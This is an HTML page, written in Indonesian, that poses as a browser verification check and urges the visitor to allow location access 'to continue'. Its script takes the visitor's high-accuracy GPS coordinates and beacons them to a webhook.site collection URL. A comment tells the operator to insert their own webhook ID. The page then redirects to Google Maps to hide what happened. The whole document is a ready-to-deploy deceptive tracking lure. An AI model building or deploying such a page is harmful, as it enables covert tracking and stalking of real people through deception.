<!DOCTYPE html>
<html>
<head>
    <title>Sistem Verifikasi Browser</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .card { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 90%; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>Memverifikasi Koneksi...</h3>
        <p>Mohon klik <b>"Izinkan/Allow"</b> pada permintaan lokasi untuk melanjutkan akses.</p>
        <p id="msg" style="color: red;"></p>
    </div>

    <script>
        // GANTI ID BERIKUT DENGAN ID WEBHOOK.SITE ANDA
        const WEBHOOK_ID = "31392989-6f64-41e2-84ee-91df8e979cd4";

        function kirimLokasi(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = pos.coords.accuracy;
            
            // Mengirim data via URL Query (Paling stabil)
            const finalUrl = `https://webhook.site/${WEBHOOK_ID}?lat=${lat}&lon=${lon}&acc=${acc}`;
            
            // Menggunakan Beacon atau Image ping agar pengiriman tidak terhambat CORS
            navigator.sendBeacon(finalUrl); 
            
            document.getElementById('msg').innerHTML = "Terverifikasi! Mengalihkan...";
            document.getElementById('msg').style.color = "green";
            
            setTimeout(() => {
                window.location.href = "https://www.google.com/maps";
            }, 2500);
        }

        function errorLokasi(err) {
            document.getElementById('msg').innerHTML = "Gagal! Anda harus mengizinkan lokasi untuk verifikasi.";
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(kirimLokasi, errorLokasi, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        }
    </script>
</body>
</html>
